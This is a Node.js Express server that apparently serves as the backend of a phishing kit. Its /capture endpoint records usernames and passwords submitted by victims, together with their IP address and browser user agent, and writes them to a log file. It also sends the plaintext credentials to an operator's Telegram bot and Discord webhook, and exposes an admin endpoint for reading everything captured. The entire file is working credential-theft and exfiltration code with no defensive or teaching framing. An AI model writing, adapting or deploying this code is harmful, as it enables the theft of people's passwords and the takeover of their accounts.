require('dotenv').config();
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const LOG = path.join(__dirname, 'captures.log');
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT  = process.env.TELEGRAM_CHAT;
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;

function logCapture(data) {
  const line = `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`;
  fs.appendFileSync(LOG, line);

  if (TELEGRAM_TOKEN && TELEGRAM_CHAT) {
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT,
        text: `🎣 capture\nIP: ${data.ip}\nUA: ${data.ua}\nuser: ${data.user}\npass: ${data.pass}`
      })
    }).catch(() => {});
  }

  if (DISCORD_WEBHOOK) {
    fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `**capture**\nIP: \`${data.ip}\`\nuser: \`${data.user}\`\npass: \`${data.pass}\``
      })
    }).catch(() => {});
  }
}

app.post('/capture', (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  logCapture({
    ip,
    ua: req.headers['user-agent'] || '',
    user: (req.body.user || '').slice(0, 200),
    pass: (req.body.pass || '').slice(0, 200),
    ts: Date.now()
  });
  res.json({ ok: true });
});

app.get('/admin/logs', (req, res) => {
  const key = req.query.key;
  if (key !== process.env.ADMIN_KEY) return res.status(403).send('nope');
  res.type('text/plain').send(fs.existsSync(LOG) ? fs.readFileSync(LOG, 'utf8') : '');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`rack-warm on :${PORT}`));